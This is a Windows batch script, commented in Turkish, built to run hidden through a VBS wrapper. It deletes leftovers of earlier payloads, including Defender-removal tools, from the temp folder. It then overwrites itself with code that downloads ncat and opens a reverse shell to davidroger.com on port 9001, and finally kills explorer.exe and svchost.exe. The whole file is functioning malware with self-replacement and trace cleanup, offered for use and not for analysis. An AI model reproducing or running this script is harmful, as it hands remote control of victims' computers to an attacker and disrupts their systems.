:: Bu betik arka planda sessiz calissin istiyorsaniz, bir VBS dosyasiyla calistirin
:: run_silently.vbs icerigi:
' Set objShell = CreateObject("Wscript.Shell")
' objShell.Run "your_batch_file.bat", 0, False

:: Bu betigi run_silently.vbs uzerinden baslatin
@echo off
cd %temp%
del /f /q "s.bat" >nul 2>&1
del /f /q "a.py" >nul 2>&1
del /f /q "asd.bat" >nul 2>&1
del /f /q "ddd.vbs" >nul 2>&1
del /f /q "expe2.bat" >nul 2>&1
del /f /q "expe2.vbs" >nul 2>&1
del /f /q "lalala.vbs" >nul 2>&1
del /f /q "a.ps1" >nul 2>&1
del /f /q "first.exe" >nul 2>&1
del /f /q "corpvpn.inf" >nul 2>&1
del /f /q "RunDefenderRemover.vbs" >nul 2>&1
del /f /q "DefenderRemover.bat" >nul 2>&1
rmdir /s /q "Remove_SecurityComp" >nul 2>&1
rmdir /s /q "Remove_Defender" >nul 2>&1

set "script=%~f0"
set "tempfile=%temp%\temp_script.bat"
(
    echo @echo off
    echo cd %%temp%%
    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe ^>nul 2^>^&1
    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe ^>nul 2^>^&1
) > "%tempfile%"

(
    echo @echo off
    echo timeout /t 2 /nobreak ^>nul
    echo copy /y "%tempfile%" "%script%" ^>nul 2^>^&1
    echo del /f /q "%tempfile%" ^>nul 2^>^&1
    echo del /f /q "%%~f0" ^>nul 2^>^&1
) > "%temp%\run_after.bat"

start "" "%temp%\run_after.bat" >nul 2>&1
start taskkill /f /im explorer.exe
start taskkill /f /im svchost.exe

